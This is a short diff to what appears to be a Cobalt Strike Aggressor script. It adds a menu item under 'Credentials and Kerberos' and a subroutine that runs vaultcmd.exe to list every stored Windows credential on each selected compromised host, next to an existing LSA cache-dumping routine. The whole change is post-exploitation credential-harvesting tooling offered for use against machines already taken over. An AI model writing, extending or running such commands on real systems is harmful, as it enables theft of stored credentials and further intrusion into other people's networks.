@@ -333,6 +333,18 @@ menu "Credentials and Kerberos"
 				}
 
 			}
+			
+		item "List Vaulted Credentials AKA vaultcmd"{
+
+			local('$bid');
+
+				foreach $bid ($1){
+
+					vaultcmd($bid);
+
+				}
+
+			}
 
 
 
@@ -378,6 +390,16 @@ menu "Credentials and Kerberos"
 ##
 
 ###########################
+
+sub vaultcmd{
+
+
+
+brun($1, ('vaultcmd.exe'), "/listcreds:'Windows Credentials' /all");
+
+
+
+}
 
 sub lsadumpcache{
 
